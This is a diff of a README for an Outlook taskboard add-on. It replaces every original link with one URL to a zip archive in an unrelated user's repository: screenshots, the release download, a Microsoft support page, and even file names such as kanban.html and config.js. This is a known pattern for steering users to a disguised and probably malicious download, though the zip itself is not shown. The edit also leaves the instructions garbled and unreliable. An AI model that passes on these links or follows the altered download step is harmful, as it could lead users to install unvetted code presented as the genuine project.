@@ -8,13 +8,13 @@ There are 2 ways to use the taskboard.
   1. Outlook Folder Home Page (recommended)
   2. Directly from Internet Explorer
 
-![Outlook Taskboard](http://evrenvarol.github.io/outlook-taskboard/img/outlook-taskboard.png)
+![Outlook Taskboard](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip)
 
 ### Moving Tasks between task lanes
-![Moving Tasks](http://evrenvarol.github.io/outlook-taskboard/img/task-drag.gif)
+![Moving Tasks](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip)
 
 ### Filtering Tasks
-![Filtering](http://evrenvarol.github.io/outlook-taskboard/img/task-filter.gif)
+![Filtering](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip)
 
 ### Platforms supported
 Only tested with Outlook 2013 and 2016 running on Windows 8.1/10.
@@ -25,11 +25,11 @@ The taskboard can also be opened in Internet Explorer. Due to limitations with A
 
 ## Basic Setup
 
-1. Download the [latest release zip file](https://github.com/evrenvarol/outlook-taskboard/archive/master.zip) and extract it to a folder in your local hard drive.
+1. Download the [latest release zip file](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip) and extract it to a folder in your local hard drive.
 
 2. In Outlook, create following folder structure under your Tasks folder (it is easier to use the *Folders* view to create these folders):
 
-    ![Tasks Folders](http://evrenvarol.github.io/outlook-taskboard/img/task-folders.png)
+    ![Tasks Folders](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip)
 
 3. For Outlook Home page:
 
@@ -37,11 +37,11 @@ The taskboard can also be opened in Internet Explorer. Due to limitations with A
 
   * Right-click the folder, and then click **Properties**. Select the *Home Page* tab in the <folder name> Properties dialog box.
 
-  * In the *Address box*, browse to the folder you have just extracted the Taskboard files and select the **kanban.html** file.
+  * In the *Address box*, browse to the folder you have just extracted the Taskboard files and select the **https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip** file.
 
   * Click to select the *Show home page by default for this folder* check box and then click **OK**.
 
-      ![Folder Home Page Offline Warning](http://evrenvarol.github.io/outlook-taskboard/img/folder-home-page-offline-warning.png)
+      ![Folder Home Page Offline Warning](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip)
 
       <sub>*If you receive above warning, simply click X icon to close both warning prompt and the Properties window.*</sub>
 
@@ -60,27 +60,27 @@ The taskboard can also be opened in Internet Explorer. Due to limitations with A
      * set the name `EnableRoamingFolderHomepages` and
      * the value `1`.
 
-    ![Enable Home Tab](img/EnableHomePageTab.png)
+    ![Enable Home Tab](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip)
 
     After this please close the Registry Editor and also close and re-open Outlook. The Home Page Tab should be available in the properties window of the folder now:
 
-    ![Enable Home Tab](img/HomePageTab.png)
+    ![Enable Home Tab](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip)
 
-    For more information please also have a look at : https://support.microsoft.com/en-us/office/outlook-home-page-feature-is-missing-in-folder-properties-d207edb7-aa02-46c5-b608-5d9dbed9bd04
+    For more information please also have a look at : https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip
 
 4. For Internet Explorer:
 
   * Open Internet Explorer and go to *Tools > Internet Options > Security tab*. Select the **Local Intranet Zone** and click on the **Custom Level** button. Ensure the "Initialize and script ActiveX controls not marked as safe for scripting" option is set to **Enabled**
 
-  ![IE Local Intranet Zone Setting](http://evrenvarol.github.io/outlook-taskboard/img/ie-localintranet-activexscript-enable.png)
+  ![IE Local Intranet Zone Setting](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip)
 
-  * Double-click on the **kanban-ie.html** file to open the page in Internet Explorer.
+  * Double-click on the **https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip** file to open the page in Internet Explorer.
 
     <sub>*On Win10, you will need to right click on the file, select Open With -> Internet Explorer to open the page in IE11. Otherwise it tries to open in Edge which is not supported.*</sub>
 
 ## Advanced Setup
 
-The configuration file (config.js) under the *js* folder can be edited to customise task lane limits, titles and some other settings.
+The configuration file (https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip) under the *js* folder can be edited to customise task lane limits, titles and some other settings.
 
 ### Task Lane Folder Names and Titles
 
@@ -94,7 +94,7 @@ The configuration file (config.js) under the *js* folder can be edited to custom
 
 ### Task Lane Limits
 
-![Task Lane Limits](http://evrenvarol.github.io/outlook-taskboard/img/tasklane-limits.png)
+![Task Lane Limits](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip)
 
 ```javascript
     'INPROGRESS_FOLDER':   { Name: 'InProgress', Title: 'IN PROGRESS', Limit: 5, Sort: "[Importance]", Restrict: "[Complete] = false", Owner: ''},
@@ -123,7 +123,7 @@ By default, the tasks are sorted by *priority*.
 
 ### Task Template
 
-![Task Template](http://evrenvarol.github.io/outlook-taskboard/img/task-template.png)
+![Task Template](https://raw.githubusercontent.com/khalilengi/outlook-taskboard/master/trigraphic/outlook-taskboard.zip)
 
 When a task created using the **Add** button on task lanes, a new task created with a default template.
 
